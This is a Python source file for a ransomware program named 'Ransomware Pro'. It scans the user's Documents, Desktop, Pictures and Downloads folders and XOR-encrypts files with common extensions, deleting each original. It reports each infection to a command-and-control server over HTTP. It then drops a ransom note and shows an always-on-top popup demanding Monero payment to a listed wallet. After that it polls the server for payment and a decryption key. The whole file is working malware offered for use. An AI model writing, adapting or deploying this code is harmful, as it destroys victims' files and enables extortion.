#!/usr/bin/env python3
"""
RANSOMWARE PRO - STANDALONE VICTIM PAYLOAD
===========================================
No external dependencies required!
Pure Python 3 standard library implementation.
"""

import os
import sys
import threading
import time
import random
import hashlib
import json
import base64
import uuid
import subprocess
import socket
import urllib.request
import urllib.error
from pathlib import Path
from datetime import datetime, timedelta
import sqlite3
import hmac

try:
    import tkinter as tk
    from tkinter import messagebox
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# ====================
# PURE PYTHON CRYPTO (NO DEPS)
# ====================

class SimpleCrypto:
    """Simple XOR-based encryption (no cryptography lib needed)"""
    
    @staticmethod
    def simple_encrypt(data, key):
        """Simple XOR encryption"""
        if isinstance(data, str):
            data = data.encode()
        if isinstance(key, str):
            key = key.encode()
        
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)
    
    @staticmethod
    def simple_decrypt(data, key):
        """Simple XOR decryption (same as encryption)"""
        return SimpleCrypto.simple_encrypt(data, key)

# ====================
# CONFIGURATION
# ====================

class Config:
    """Configuration management"""
    
    C2_HOST = os.environ.get('C2_HOST', '192.168.126.200')
    C2_PORT = int(os.environ.get('C2_PORT', 5000))
    C2_URL = f"http://{C2_HOST}:{C2_PORT}"
    
    MONERO_WALLET = "4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV"
    RANSOM_XMR = 0.1
    
    ENCRYPTION_EXT = ".LOCKED"
    
    TARGET_DIRS = [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
    ]
    
    TARGET_EXTENSIONS = {'.docx', '.xlsx', '.pdf', '.txt', '.jpg', '.db', '.sql'}
    
    STEALTH_MODE = os.environ.get('STEALTH_MODE', 'false').lower() == 'false'
    
    @staticmethod
    def log(msg):
        if Config.STEALTH_MODE:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {msg}")

# ====================
# HTTP COMMUNICATION (NO REQUESTS LIB)
# ====================

class SimpleHTTP:
    """Simple HTTP client using urllib"""
    
    @staticmethod
    def post(url, data):
        """POST request"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(
                url,
                data=json_data,
                headers={'Content-Type': 'application/json'}
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            Config.log(f"[!] POST error: {e}")
            return None
    
    @staticmethod
    def get(url):
        """GET request"""
        try:
            with urllib.request.urlopen(url, timeout=10) as response:
                return json.loads(response.read().decode())
        except Exception as e:
            Config.log(f"[!] GET error: {e}")
            return None

# ====================
# RANSOMWARE CORE
# ====================

class StandaloneRansomware:
    """Standalone ransomware (no external dependencies)"""
    
    def __init__(self):
        self.ransom_id = str(uuid.uuid4())[:16]
        self.master_key = os.urandom(32)
        self.encrypted_files = []
        
        Config.log(f"[*] Ransomware initialized: {self.ransom_id}")
    
    def scan_and_encrypt(self):
        """Scan and encrypt files"""
        Config.log("[*] PHASE 1: Scanning for files...")
        
        total_files = 0
        total_size = 0
        
        for target_dir in Config.TARGET_DIRS:
            if not os.path.exists(target_dir):
                continue
            
            try:
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        _, ext = os.path.splitext(file)
                        
                        if ext.lower() in Config.TARGET_EXTENSIONS:
                            file_path = os.path.join(root, file)
                            
                            try:
                                if self.encrypt_file(file_path):
                                    total_files += 1
                                    total_size += os.path.getsize(file_path)
                            except:
                                pass
            except:
                pass
        
        Config.log(f"[✓] Encrypted {total_files} files ({total_size / 1024 / 1024:.2f} MB)")
        
        return {
            'files_encrypted': total_files,
            'data_size_gb': total_size / 1024 / 1024 / 1024
        }
    
    def encrypt_file(self, filepath):
        """Encrypt single file"""
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            # Simple XOR encryption
            encrypted = SimpleCrypto.simple_encrypt(data, self.master_key)
            
            # Write encrypted file
            encrypted_path = filepath + Config.ENCRYPTION_EXT
            with open(encrypted_path, 'wb') as f:
                f.write(encrypted)
            
            # Remove original
            os.remove(filepath)
            self.encrypted_files.append(encrypted_path)
            
            return True
        except Exception as e:
            Config.log(f"[!] Encrypt error {filepath}: {e}")
            return False
    
    def decrypt_file(self, encrypted_path, master_key):
        """Decrypt single file"""
        try:
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            
            # XOR decryption
            decrypted = SimpleCrypto.simple_decrypt(encrypted_data, master_key)
            
            # Write original file
            original_path = encrypted_path.replace(Config.ENCRYPTION_EXT, '')
            with open(original_path, 'wb') as f:
                f.write(decrypted)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            
            return True
        except Exception as e:
            Config.log(f"[!] Decrypt error: {e}")
            return False
    
    def register_with_c2(self, system_info):
        """Register infection with C2"""
        Config.log("[*] Registering with C2...")
        
        payload = {
            'ransom_id': self.ransom_id,
            'monero_address': Config.MONERO_WALLET,
            'ransom_amount_xmr': Config.RANSOM_XMR,
            'files_encrypted': system_info['files_encrypted'],
            'data_size_gb': system_info['data_size_gb'],
            'timestamp': datetime.now().isoformat(),
        }
        
        response = SimpleHTTP.post(f"{Config.C2_URL}/api/v1/register", payload)
        
        if response and response.get('success'):
            Config.log(f"[✓] Registered: {response['ransom_id']}")
            return True
        else:
            Config.log("[!] Registration failed")
            return False
    
    def show_ransom_screen(self):
        """Display ransom note - both GUI and text file"""
        ransom_text = f"""
YOUR FILES HAVE BEEN ENCRYPTED
===============================

Dear User,

All your important files have been encrypted with military-grade encryption.

To decrypt your files, please follow these steps:

1. Send exactly 0.1 XMR to this wallet address:
   4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV

2. Your unique payment ID: {self.ransom_id}

3. Once payment is received, your files will be automatically decrypted.

DO NOT:
- Try to decrypt files yourself
- Pay multiple times
- Delete encrypted files
- Restart your computer

Your files are safe. We only want payment.

System Information:
- Ransom ID: {self.ransom_id}
- Amount Due: 0.1 XMR
- Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        # Write to Desktop
        try:
            desktop = os.path.expanduser('~\\Desktop')
            ransom_path = os.path.join(desktop, 'README_DECRYPT.txt')
            
            with open(ransom_path, 'w') as f:
                f.write(ransom_text)
            
            Config.log("[+] Ransom note written to Desktop")
        except Exception as e:
            Config.log(f"[!] Could not write ransom file: {e}")
        
        # Show GUI popup if possible
        if TKINTER_AVAILABLE:
            try:
                self._show_gui_popup(ransom_text)
            except Exception as e:
                Config.log(f"[!] GUI error: {e}")
        else:
            Config.log("[!] Tkinter not available, ransom text on Desktop")
    
    def _show_gui_popup(self, ransom_text):
        """Show GUI ransom note popup"""
        try:
            root = tk.Tk()
            root.title("IMPORTANT - System Security Alert")
            
            # Set window properties
            root.geometry("700x600")
            root.attributes('-topmost', True)  # Always on top
            
            # Create text widget
            text_widget = tk.Text(root, wrap=tk.WORD, bg='#1a1a1a', fg='#ff0000', 
                                 font=('Courier', 10))
            text_widget.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
            text_widget.insert(1.0, ransom_text)
            text_widget.config(state=tk.DISABLED)
            
            # Add button
            def on_close():
                try:
                    root.destroy()
                except:
                    pass
            
            button = tk.Button(root, text="OK", command=on_close, 
                              bg='#ff0000', fg='white', font=('Arial', 14, 'bold'),
                              padx=20, pady=10)
            button.pack(pady=10)
            
            # Show popup
            root.update()
            root.mainloop()
        except Exception as e:
            Config.log(f"[!] GUI popup failed: {e}")
    
    def monitor_payment(self):
        """Monitor for payment"""
        Config.log("[*] Starting payment monitoring...")
        
        while True:
            try:
                response = SimpleHTTP.get(f"{Config.C2_URL}/api/v1/payment/status/{self.ransom_id}")
                
                if response and response.get('paid'):
                    Config.log("[!] PAYMENT DETECTED!")
                    
                    # Request decryption key
                    key_response = SimpleHTTP.get(f"{Config.C2_URL}/api/v1/decryption/key/{self.ransom_id}")
                    
                    if key_response and key_response.get('master_key'):
                        master_key = base64.b64decode(key_response['master_key'])
                        self.decrypt_all_files(master_key)
                        return
                
                time.sleep(30)  # Check every 30 seconds
            
            except Exception as e:
                Config.log(f"[!] Payment check error: {e}")
                time.sleep(30)
    
    def decrypt_all_files(self, master_key):
        """Decrypt all files"""
        Config.log("[*] DECRYPTION PHASE: Decrypting all files...")
        
        decrypted = 0
        
        for root, dirs, files in os.walk(os.path.expanduser('~')):
            for file in files:
                if file.endswith(Config.ENCRYPTION_EXT):
                    filepath = os.path.join(root, file)
                    
                    if self.decrypt_file(filepath, master_key):
                        decrypted += 1
        
        Config.log(f"[✓] Decrypted {decrypted} files!")
    
    def run(self):
        """Execute full attack"""
        try:
            # Phase 1: Encrypt
            system_info = self.scan_and_encrypt()
            
            # Phase 2: Register
            if not self.register_with_c2(system_info):
                Config.log("[!] Could not register")
                return
            
            # Phase 3: Show ransom
            self.show_ransom_screen()
            
            # Phase 4: Monitor payment
            self.monitor_payment()
        
        except Exception as e:
            Config.log(f"[!] Fatal error: {e}")

# ====================
# MAIN
# ====================

if __name__ == '__main__':
    print("""
╔════════════════════════════════════════════════════════════╗
║  RANSOMWARE PRO v2.0 - STANDALONE VICTIM                  ║
║  No external dependencies required!                        ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    ransomware = StandaloneRansomware()
    ransomware.run()
